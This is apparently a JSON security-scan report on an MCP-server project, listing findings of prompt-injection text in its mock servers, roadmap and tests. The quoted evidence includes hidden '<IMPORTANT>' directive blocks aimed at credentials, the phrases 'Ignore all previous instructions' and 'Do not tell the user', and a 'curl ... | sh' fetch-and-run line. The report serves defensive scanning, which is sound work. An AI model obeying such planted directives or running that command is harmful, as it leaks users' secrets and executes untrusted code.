@@ -1,0 +1,83 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "KaushalJogi2002/leanwall",
+    "version": "315793eed6c6d14b117e1e2ac185eb3bc4b109d8",
+    "download": "https://codeload.github.com/KaushalJogi2002/leanwall/tar.gz/315793eed6c6d14b117e1e2ac185eb3bc4b109d8"
+  },
+  "archive_sha256": "7c757b1ca2a6aeb01d8df443820914baa58a7b42533481779902f6f98706e43a",
+  "findings": [
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "leanwall-315793eed6c6d14b117e1e2ac185eb3bc4b109d8/src/leanwall/mock_servers/comms.py",
+      "line": 132,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "1dd1f8401fe5de29b12fd2a087283a2bf2bc17eb31d7a3a18c3d6963903f7e97"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "leanwall-315793eed6c6d14b117e1e2ac185eb3bc4b109d8/ROADMAP.md",
+      "line": 94,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "175e239740f10d3711f7fb656e4841b1c0f7c3c64ff6ec7aa204d6e3ba46bff3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "leanwall-315793eed6c6d14b117e1e2ac185eb3bc4b109d8/tests/test_scanner.py",
+      "line": 16,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "ee4f06faaffe05d26e7182fbabc72b763b7e29042d20305b202c9c57e86f26ef"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "leanwall-315793eed6c6d14b117e1e2ac185eb3bc4b109d8/tests/test_scanner.py",
+      "line": 17,
+      "evidence": "Do not tell the user",
+      "file_sha256": "ee4f06faaffe05d26e7182fbabc72b763b7e29042d20305b202c9c57e86f26ef"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "leanwall-315793eed6c6d14b117e1e2ac185eb3bc4b109d8/tests/test_scanner.py",
+      "line": 18,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "ee4f06faaffe05d26e7182fbabc72b763b7e29042d20305b202c9c57e86f26ef"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "leanwall-315793eed6c6d14b117e1e2ac185eb3bc4b109d8/tests/test_scanner.py",
+      "line": 22,
+      "evidence": "curl -s http://x.sh | sh",
+      "file_sha256": "ee4f06faaffe05d26e7182fbabc72b763b7e29042d20305b202c9c57e86f26ef"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "attacker.example.com",
+    "evil.example.com",
+    "files.pythonhosted.org",
+    "github.com",
+    "img.shields.io",
+    "mcp.internal.example.com",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "static.modelcontextprotocol.io",
+    "token.actions.githubusercontent.com",
+    "x.sh"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
